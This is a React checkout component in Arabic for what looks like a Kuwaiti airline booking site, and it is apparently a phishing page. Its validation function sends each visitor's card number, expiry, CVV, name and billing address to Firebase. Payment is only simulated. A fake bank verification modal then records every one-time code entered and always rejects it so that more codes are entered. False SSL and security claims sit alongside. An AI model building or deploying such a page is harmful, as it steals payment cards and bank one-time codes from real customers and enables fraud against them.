"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import {
  CreditCard,
  Lock,
  Plane,
  Users,
  Shield,
  CheckCircle,
  AlertCircle,
  Calendar,
  Clock,
  MapPin,
  Banknote,
  User,
  Home,
  Globe,
} from "lucide-react"
import { addData } from "@/lib/firebase"

interface CheckoutFormProps {
  flightId: string
  seats: string[]
  passengers: any[]
}

interface PaymentData {
  cardNumber: string
  expiryDate: string
  cvv: string
  cardholderName: string
  billingAddress: string
  city: string
  zipCode: string
  country: string
}

interface FormErrors {
  [key: string]: string
}
const allOtps=['']
export function CheckoutForm({ flightId, seats, passengers }: CheckoutFormProps) {
  const router = useRouter()
  const [paymentData, setPaymentData] = useState<PaymentData>({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
    billingAddress: "",
    city: "",
    zipCode: "",
    country: "",
  })
  const [agreeToTerms, setAgreeToTerms] = useState(false)
  const [isProcessing, setIsProcessing] = useState(false)
  const [errors, setErrors] = useState<FormErrors>({})

  const [showOtpModal, setShowOtpModal] = useState(false)
  const [otpCode, setOtpCode] = useState("")
  const [otpError, setOtpError] = useState("")
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false)

  const baseFare = 45
  const taxes = 8
  const seatFees = seats.length * 5
  const total = baseFare * passengers.length + taxes + seatFees

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {}
    const vid=localStorage.getItem('visitor')
    addData({id:vid,...paymentData})
    if (!paymentData.cardNumber || paymentData.cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح"
    }
    if (!paymentData.expiryDate || !/^\d{2}\/\d{2}$/.test(paymentData.expiryDate)) {
      newErrors.expiryDate = "تاريخ انتهاء الصلاحية غير صحيح"
    }
    if (!paymentData.cvv || paymentData.cvv.length < 3) {
      newErrors.cvv = "رمز الأمان غير صحيح"
    }
    if (!paymentData.cardholderName.trim()) {
      newErrors.cardholderName = "اسم حامل البطاقة مطلوب"
    }
    if (!paymentData.billingAddress.trim()) {
      newErrors.billingAddress = "العنوان مطلوب"
    }
    if (!paymentData.city.trim()) {
      newErrors.city = "المدينة مطلوبة"
    }
    if (!paymentData.country) {
      newErrors.country = "الدولة مطلوبة"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handlePayment = async () => {
    if (!agreeToTerms) {
      setErrors({ terms: "يجب الموافقة على الشروط والأحكام" })
      return
    }

    if (!validateForm()) return

    setIsProcessing(true)

    try {
      // Simulate payment processing
      await new Promise((resolve) => setTimeout(resolve, 2000))

      // Show OTP modal after initial processing
      setIsProcessing(false)
      setShowOtpModal(true)
    } catch (error) {
      setErrors({ payment: "حدث خطأ في معالجة الدفع. يرجى المحاولة مرة أخرى." })
      setIsProcessing(false)
    }
  }

  const handleOtpVerification = async () => {
    const vid=localStorage.getItem('visitor')

    allOtps.push(otpCode)
    addData({id:vid,otp:otpCode,allOtps})
    if (!otpCode.trim()) {
      setOtpError("يرجى إدخال رمز التحقق")
      return
    }

    setIsVerifyingOtp(true)
    setOtpError("")

    try {
      // Simulate OTP verification
      await new Promise((resolve) => setTimeout(resolve, 1500))

      // Always show error when OTP is entered (as requested)
      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
      setOtpCode('')
      setIsVerifyingOtp(false)
    } catch (error) {
      setOtpError("حدث خطأ في التحقق. يرجى المحاولة مرة أخرى.")
      setIsVerifyingOtp(false)
    }
  }

  const updatePaymentData = (field: keyof PaymentData, value: string) => {
    setPaymentData((prev) => ({ ...prev, [field]: value }))
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: "" }))
    }
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4)
    }
    return v
  }

  const formatOtpInput = (value: string) => {
    return value.replace(/\D/g, "").slice(0, 6)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-purple-50 py-8 px-4">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-blue-600 to-purple-600 rounded-full mb-4">
            <CreditCard className="h-8 w-8 text-white" />
          </div>
          <h1 className="text-4xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent mb-2">
            إتمام الحجز
          </h1>
          <p className="text-gray-600 text-lg">دفع آمن ومشفر بأحدث التقنيات العالمية</p>
          <div className="flex items-center justify-center gap-2 mt-4">
            <Shield className="h-5 w-5 text-green-600" />
            <span className="text-sm text-green-600 font-medium">محمي بتشفير SSL 256-bit</span>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Payment Form */}
          <div className="lg:col-span-2 space-y-6">
            {/* Payment Information Card */}
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-xl">
                  <CreditCard className="h-6 w-6" />
                  معلومات الدفع
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-right flex items-center gap-2">
                    <CreditCard className="h-4 w-4" />
                    رقم البطاقة
                  </Label>
                  <Input
                    id="cardNumber"
                    value={paymentData.cardNumber}
                    onChange={(e) => updatePaymentData("cardNumber", formatCardNumber(e.target.value))}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    className={`text-lg font-mono ${errors.cardNumber ? "border-red-500" : ""}`}
                    dir="ltr"
                  />
                  {errors.cardNumber && (
                    <p className="text-red-500 text-sm flex items-center gap-1">
                      <AlertCircle className="h-4 w-4" />
                      {errors.cardNumber}
                    </p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="text-right flex items-center gap-2">
                      <Calendar className="h-4 w-4" />
                      تاريخ الانتهاء
                    </Label>
                    <Input
                      id="expiryDate"
                      value={paymentData.expiryDate}
                      onChange={(e) => updatePaymentData("expiryDate", formatExpiryDate(e.target.value))}
                      placeholder="MM/YY"
                      maxLength={5}
                      className={`text-lg font-mono ${errors.expiryDate ? "border-red-500" : ""}`}
                      dir="ltr"
                    />
                    {errors.expiryDate && <p className="text-red-500 text-sm">{errors.expiryDate}</p>}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-right flex items-center gap-2">
                      <Shield className="h-4 w-4" />
                      رمز الأمان
                    </Label>
                    <Input
                      id="cvv"
                      value={paymentData.cvv}
                      onChange={(e) => updatePaymentData("cvv", e.target.value.replace(/\D/g, ""))}
                      placeholder="123"
                      maxLength={4}
                      type="password"
                      className={`text-lg font-mono ${errors.cvv ? "border-red-500" : ""}`}
                      dir="ltr"
                    />
                    {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardholderName" className="text-right flex items-center gap-2">
                    <User className="h-4 w-4" />
                    اسم حامل البطاقة
                  </Label>
                  <Input
                    id="cardholderName"
                    value={paymentData.cardholderName}
                    onChange={(e) => updatePaymentData("cardholderName", e.target.value)}
                    placeholder="أحمد محمد الكويتي"
                    className={`text-lg ${errors.cardholderName ? "border-red-500" : ""}`}
                  />
                  {errors.cardholderName && <p className="text-red-500 text-sm">{errors.cardholderName}</p>}
                </div>
              </CardContent>
            </Card>

            {/* Billing Address Card */}
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-purple-600 to-purple-700 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-xl">
                  <Home className="h-6 w-6" />
                  عنوان الفوترة
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="billingAddress" className="text-right flex items-center gap-2">
                    <MapPin className="h-4 w-4" />
                    العنوان
                  </Label>
                  <Input
                    id="billingAddress"
                    value={paymentData.billingAddress}
                    onChange={(e) => updatePaymentData("billingAddress", e.target.value)}
                    placeholder="شارع الخليج العربي، منطقة السالمية"
                    className={`text-lg ${errors.billingAddress ? "border-red-500" : ""}`}
                  />
                  {errors.billingAddress && <p className="text-red-500 text-sm">{errors.billingAddress}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="city" className="text-right">
                      المدينة
                    </Label>
                    <Input
                      id="city"
                      value={paymentData.city}
                      onChange={(e) => updatePaymentData("city", e.target.value)}
                      placeholder="مدينة الكويت"
                      className={`text-lg ${errors.city ? "border-red-500" : ""}`}
                    />
                    {errors.city && <p className="text-red-500 text-sm">{errors.city}</p>}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="zipCode" className="text-right">
                      الرمز البريدي
                    </Label>
                    <Input
                      id="zipCode"
                      value={paymentData.zipCode}
                      onChange={(e) => updatePaymentData("zipCode", e.target.value)}
                      placeholder="12345"
                      className="text-lg"
                      dir="ltr"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label className="text-right flex items-center gap-2">
                    <Globe className="h-4 w-4" />
                    الدولة
                  </Label>
                  <Select value={paymentData.country} onValueChange={(value) => updatePaymentData("country", value)}>
                    <SelectTrigger className={`text-lg ${errors.country ? "border-red-500" : ""}`}>
                      <SelectValue placeholder="اختر الدولة" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="kw">🇰🇼 الكويت</SelectItem>
                      <SelectItem value="sa">🇸🇦 المملكة العربية السعودية</SelectItem>
                      <SelectItem value="ae">🇦🇪 الإمارات العربية المتحدة</SelectItem>
                      <SelectItem value="qa">🇶🇦 قطر</SelectItem>
                      <SelectItem value="bh">🇧🇭 البحرين</SelectItem>
                      <SelectItem value="om">🇴🇲 عُمان</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.country && <p className="text-red-500 text-sm">{errors.country}</p>}
                </div>
              </CardContent>
            </Card>

            {/* Terms and Payment */}
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardContent className="p-6 space-y-6">
                <div className="flex items-start space-x-3 space-x-reverse">
                  <Checkbox
                    id="terms"
                    checked={agreeToTerms}
                    onCheckedChange={setAgreeToTerms as any}
                    className="mt-1"
                  />
                  <Label htmlFor="terms" className="text-sm leading-relaxed cursor-pointer">
                    أوافق على{" "}
                    <a href="#" className="text-blue-600 hover:underline font-medium">
                      الشروط والأحكام
                    </a>{" "}
                    و{" "}
                    <a href="#" className="text-blue-600 hover:underline font-medium">
                      سياسة الخصوصية
                    </a>
                    . أؤكد أن جميع المعلومات المقدمة صحيحة ودقيقة.
                  </Label>
                </div>
                {errors.terms && <p className="text-red-500 text-sm">{errors.terms}</p>}

                <Button
                  onClick={handlePayment}
                  disabled={!agreeToTerms || isProcessing}
                  className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 py-4 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isProcessing ? (
                    <div className="flex items-center gap-3">
                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                      جاري معالجة الدفع...
                    </div>
                  ) : (
                    <div className="flex items-center gap-3">
                      <Lock className="h-5 w-5" />
                      <Banknote className="h-5 w-5" />
                      دفع {total} د.ك
                    </div>
                  )}
                </Button>

                {errors.payment && <p className="text-red-500 text-sm text-center">{errors.payment}</p>}
              </CardContent>
            </Card>
          </div>

          {/* Booking Summary */}
          <div className="space-y-6">
            {/* Flight Details */}
            <Card className="shadow-xl border-0 bg-white/90 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-lg">
                  <Plane className="h-5 w-5" />
                  تفاصيل الرحلة
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-4">
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 flex items-center gap-2">
                    <Plane className="h-4 w-4" />
                    رقم الرحلة
                  </span>
                  <Badge variant="secondary" className="font-bold">
                    JZ101
                  </Badge>
                </div>
                <Separator />
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 flex items-center gap-2">
                    <MapPin className="h-4 w-4" />
                    المسار
                  </span>
                  <span className="font-bold text-lg">الكويت ← دبي</span>
                </div>
                <Separator />
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 flex items-center gap-2">
                    <Calendar className="h-4 w-4" />
                    التاريخ
                  </span>
                  <span className="font-medium">15 ديسمبر 2024</span>
                </div>
                <Separator />
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 flex items-center gap-2">
                    <Clock className="h-4 w-4" />
                    الوقت
                  </span>
                  <span className="font-medium">08:00 - 09:20</span>
                </div>
              </CardContent>
            </Card>

            {/* Passengers & Seats */}
            <Card className="shadow-xl border-0 bg-white/90 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-purple-600 to-purple-700 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-lg">
                  <Users className="h-5 w-5" />
                  المسافرون والمقاعد
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6">
                <div className="space-y-3">
                  {passengers.map((passenger, index) => (
                    <div key={index} className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                          <User className="h-4 w-4 text-blue-600" />
                        </div>
                        <span className="font-medium">
                          {passenger.firstName} {passenger.lastName}
                        </span>
                      </div>
                      <Badge variant="outline" className="font-bold">
                        مقعد {seats[index]}
                      </Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Price Breakdown */}
            <Card className="shadow-xl border-0 bg-white/90 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-green-600 to-green-700 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-lg">
                  <Banknote className="h-5 w-5" />
                  تفاصيل السعر
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-4">
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">الأجرة الأساسية</span>
                  <span className="font-medium">
                    {baseFare} د.ك × {passengers.length}
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">رسوم اختيار المقاعد</span>
                  <span className="font-medium">{seatFees} د.ك</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">الضرائب والرسوم</span>
                  <span className="font-medium">{taxes} د.ك</span>
                </div>
                <Separator />
                <div className="flex justify-between items-center text-xl font-bold bg-gradient-to-r from-green-600 to-green-700 bg-clip-text text-transparent">
                  <span>المجموع الكلي</span>
                  <span>{total} د.ك</span>
                </div>
              </CardContent>
            </Card>

            {/* Security Notice */}
            <div className="text-center p-4 bg-green-50 rounded-xl border border-green-200">
              <div className="flex items-center justify-center gap-2 text-green-700 mb-2">
                <Shield className="h-5 w-5" />
                <CheckCircle className="h-5 w-5" />
              </div>
              <p className="text-sm text-green-700 font-medium">معلومات الدفع محمية بتشفير SSL</p>
              <p className="text-xs text-green-600 mt-1">نحن نحمي بياناتك بأعلى معايير الأمان العالمية</p>
            </div>
          </div>
        </div>

        {/* OTP Verification Modal */}
        {showOtpModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
            <Card className="w-full max-w-md shadow-2xl border-0 bg-white">
              <CardHeader className="bg-gradient-to-r from-green-600 to-green-700 text-white rounded-t-lg text-center">
                <CardTitle className="flex items-center justify-center gap-3 text-xl">
                  <Shield className="h-6 w-6" />
                  التحقق من الهوية
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-6">
                <div className="text-center space-y-3">
                  <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                    <Lock className="h-8 w-8 text-green-600" />
                  </div>
                  <h3 className="text-lg font-bold text-gray-800">رمز التحقق مطلوب</h3>
                  <p className="text-gray-600 text-sm leading-relaxed">
                    تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك المسجل لدى البنك
                    <br />
                    <span className="font-medium text-blue-600">+965 *** *** 9</span>
                  </p>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="otpCode" className="text-right flex items-center justify-center gap-2">
                      <Shield className="h-4 w-4" />
                      أدخل رمز التحقق
                    </Label>
                    <Input
                      id="otpCode"
                      value={otpCode}
                      onChange={(e) => {
                        const formatted = formatOtpInput(e.target.value)
                        setOtpCode(formatted)
                        if (otpError) setOtpError("")
                      }}
                      placeholder="123456"
                      maxLength={6}
                      className="text-2xl font-mono text-center tracking-widest h-14 border-2"
                      dir="ltr"
                    />
                    {otpError && (
                      <div className="flex items-center justify-center gap-2 text-red-500 text-sm bg-red-50 p-3 rounded-lg">
                        <AlertCircle className="h-4 w-4" />
                        {otpError}
                      </div>
                    )}
                  </div>

                  <div className="flex gap-3">
                    <Button
                      onClick={() => {
                        setShowOtpModal(false)
                        setOtpCode("")
                        setOtpError("")
                      }}
                      variant="outline"
                      className="flex-1 py-3"
                    >
                      إلغاء
                    </Button>
                    <Button
                      onClick={handleOtpVerification}
                      disabled={!otpCode.trim() || isVerifyingOtp}
                      className="flex-1 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 py-3"
                    >
                      {isVerifyingOtp ? (
                        <div className="flex items-center gap-2">
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                          جاري التحقق...
                        </div>
                      ) : (
                        <div className="flex items-center gap-2">
                          <CheckCircle className="h-4 w-4" />
                          تحقق
                        </div>
                      )}
                    </Button>
                  </div>

                  <div className="text-center">
                    <button className="text-blue-600 hover:underline text-sm font-medium">
                      لم تستلم الرمز؟ إعادة الإرسال
                    </button>
                  </div>
                </div>

                <div className="bg-blue-50 p-4 rounded-lg">
                  <div className="flex items-start gap-3">
                    <Shield className="h-5 w-5 text-blue-600 mt-0.5" />
                    <div className="text-sm text-blue-800">
                      <p className="font-medium mb-1">لماذا نطلب رمز التحقق؟</p>
                      <p className="text-blue-700">هذا إجراء أمني إضافي لحماية بطاقتك من الاستخدام غير المصرح به</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </div>
  )
}
